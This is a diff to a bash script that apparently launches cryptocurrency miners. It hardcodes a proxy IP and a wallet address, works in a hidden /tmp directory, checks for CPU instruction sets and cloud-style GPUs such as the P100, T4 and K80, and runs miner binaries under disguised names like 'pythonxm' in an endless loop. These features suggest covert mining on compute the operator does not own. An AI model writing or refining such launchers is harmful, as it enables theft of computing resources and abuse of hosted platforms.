@@ -1,10 +1,10 @@
-#!/bin/bash -xe
+#!/bin/bash
+echo 
 echo -e '####################################################################################'
-echo -e '##################   '"RV"' Ver:0.2.18     ############################'
+echo -e '##################   '"RV Tes CU"' Ver:0.3.1      ############################'
 echo -e '####################################################################################'
-
-mkdir -p /tmp/.rv/
-cd /tmp/.mx/
+mkdir -p /tmp/.max/
+cd  /tmp/.max/
 
 PROX=78.47.69.185
 ETPort=443
@@ -17,7 +17,7 @@ VCThreads=$[$(nproc)*4]
 XMThreads=$[$(nproc)*1]
 
 #Debug=True
-Debug=Flase
+Debug=False
 
 #Keys
 W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
@@ -139,13 +139,13 @@ BCColor="$On_Green""$BICyan"
 elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
 then
 echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
-OP=XM
+OP=VC
 CPU='AVX2'
 BCColor="$On_Blue""$BICyan"
 elif [ $(lscpu |grep avx |wc -l) == 1 ]
 then
 echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
-OP=XM
+OP=VC
 CPU='AVX'
 BCColor="$On_Yellow""$BICyan"
 else
@@ -162,7 +162,7 @@ then
 
 echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
 GPU=P100
-OPG=ET
+OPG=RV
 PROG=CU
 BGColor=$On_IGreen
 elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
@@ -182,14 +182,14 @@ then
 echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
 GPU=T4
 OPG=ET
-PROG=CL
+PROG=CU
 BGColor=$On_IBlue
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
 echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
 GPU=K80
 OPG=RV
-PROG=CL
+PROG=CU
 BGColor="$On_IYellow""$BRed"
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
@@ -212,7 +212,6 @@ fi
 ########                execution                        #########     
 ##################################################################
 #OP=$OP
-#OPG=$OPG
 OPG=RV
 OP=VC
 
@@ -222,7 +221,7 @@ while true
 do
 if [ $OP == "XM" ]
 then
-   ####### XM
+    ####### XM
     #               Executable
     echo start >> ooutxm
     rm -rf pythonxm
@@ -282,7 +281,7 @@ fi
 while true
     do
         i=$[$i+1]
-        echo -e "${BIYellow}${BGColor}CPU OP: $OP | GPU OP: $OPG  | GPU: $GPU  |  CPU ARC: $CPU  | IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG"
+        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU ARC: $CPU  |${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"
 
         Gacc=$(grep Acc oout | wc -l)
         Vacc=$(grep Acc ooutvc | wc -l)
